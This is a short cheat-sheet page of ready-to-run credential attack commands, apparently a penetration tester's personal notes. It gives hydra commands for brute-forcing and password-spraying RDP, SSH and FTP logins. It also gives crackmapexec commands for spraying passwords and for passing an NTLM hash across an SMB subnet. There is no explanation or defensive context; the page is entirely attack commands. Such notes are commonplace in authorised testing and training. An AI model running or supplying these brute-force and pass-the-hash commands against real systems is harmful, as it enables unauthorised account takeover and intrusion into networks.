public:: true

- RDP
  ```bash
  hydra -L users.txt -p 'passw0rd' -M machines-rdp.txt -t 4 rdp -V
  ```
  ```bash
  hydra -L users.txt -P wordlist.txt -M machines-with-rdp.txt -t 4 rdp -V
  ```
- SSH
  ```bash
  hydra -L users.txt -p 'passw0rd' -M machines-rdp.txt -t 4 ssh -V
  ```
  ```bash
  hydra -L users.txt -P wordlist.txt -M machines-rdp.txt -t 4 ssh -V
  ```
- SMB
  ```bash
  crackmapexec smb 172.16.197.0/24 -u domain_users.txt -p 'passw0rd'
  ```
  ```bash
  crackmapexec smb 172.16.197.0/24 -u domain_users.txt -p wordlist.txt
  ```
  ```bash
  crackmapexec smb 172.16.197.0/24 -u domain_users.txt -H '82a73cad8b8ff3ad60fad51502d0cfa5'
  ```
  ```bash
  crackmapexec smb 172.16.197.0/24 -u domain_users.txt -H hashes.txt
  ```
- FTP
  ```bash
  hydra -L users.txt -P passwords.txt -t 4 -V ftp://192.168.231.245
  ```